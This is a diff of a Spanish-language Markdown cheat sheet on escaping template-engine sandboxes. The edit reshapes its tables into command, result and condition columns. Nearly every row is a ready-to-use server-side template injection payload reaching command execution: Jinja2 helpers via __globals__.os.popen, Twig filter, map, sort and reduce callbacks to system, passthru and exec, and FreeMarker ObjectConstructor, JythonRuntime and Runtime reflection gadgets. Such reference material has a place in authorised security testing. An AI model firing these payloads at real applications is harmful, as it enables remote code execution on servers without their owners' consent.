@@ -21,10 +21,9 @@ linked:
 
 ## Jinja2 Sandbox Bypass
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | `SandboxedEnvironment` bloquea acceso a atributos privados (`_*`, `__*`). | Bypasses se basan en encontrar atributos NO bloqueados que dan paso al runtime. |
-| Bypass clásico via `lipsum` | `{{lipsum.__globals__.os.popen('id').read()}}` | Helper Flask. Bloqueado en sandboxed por default — pero funcional en `unsafe`. |
+| `{{lipsum.__globals__.os.popen('id').read()}}` | RCE via helper Flask `lipsum` | SandboxedEnvironment con lipsum no filtrado. |
 | Bypass via `cycler` | `{{cycler.__init__.__globals__.os.popen('id').read()}}` | Helper Jinja2. |
 | Bypass via `joiner` | `{{joiner.__init__.__globals__.os.popen('id').read()}}` | Helper Jinja2. |
 | Bypass via `namespace` | `{{namespace.__init__.__globals__.os.popen('id').read()}}` | Helper Jinja2. |
@@ -50,10 +49,9 @@ ___
 
 ## Twig Sandbox Bypass
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Sandbox extension de Twig restringe filters/funciones permitidas. Allowlist explícita. | Bypass = encontrar filter permitido que invoca callback inseguro. |
-| Bypass via `filter` | `{{['id']\|filter('system')}}` | Filter() acepta callback custom — invocar `system`. |
+| `{{['id']\|filter('system')}}` | RCE via filter callback | Twig sandbox con filter() permitido. |
 | Bypass via `map` | `{{['id']\|map('passthru')\|join('')}}` | Map igual. |
 | Bypass via `sort` | `{{[1,2]\|sort('exec')}}` | Sort callback. |
 | Bypass via `reduce` | `{{[1,2]\|reduce('system','id')}}` | Reduce callback. |
@@ -69,10 +67,9 @@ ___
 
 ## FreeMarker Security Manager Bypass
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | FreeMarker `Configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER)` restringe `?new()` a whitelist. | Bypass = encontrar class permitida que da gateway. |
-| Bypass via Hashtable | `<#assign x="freemarker.template.utility.ObjectConstructor"?new()> ${x("java.util.Hashtable")}` | Si ObjectConstructor permitido. |
+| `<#assign x="freemarker.template.utility.ObjectConstructor"?new()> ${x("java.util.Hashtable")}` | Bypass SAFER_RESOLVER via ObjectConstructor | ObjectConstructor permitido. |
 | Bypass via JythonRuntime | `<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>...</@value>` | Si Jython en classpath. |
 | ALLOWS_NOTHING_RESOLVER bypass | Si resolver bloquea `?new()` totalmente | Buscar gadget en context expuesto. |
 | Bypass via reflection | `${"".class.forName("java.lang.Runtime").getMethod("exec",...)}` | Si ClassResolver permite class lookup. |
@@ -85,10 +82,9 @@ ___
 
 ## Filter Abuse para Escape
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Filtros template se ejecutan post-evaluación. Si el filter acepta callback (function pointer), invocarlo con args controlados. | Vector cross-engine. |
-| Pattern Twig filter | `{{value\|filter('callback')}}` | Twig acepta. |
+| `{{value\|filter('callback')}}` | Twig — invocar callback custom | Filter() en sandbox acepta callable. |
 | Pattern Jinja2 attr | `{{value\|attr('method_name')}}` | Acceso indirecto. |
 | Pattern Liquid | `{{value\|filter_name: arg}}` | Si filter custom inseguro. |
 | Pattern Velocity | `$value.method($args)` | Method invocation. |
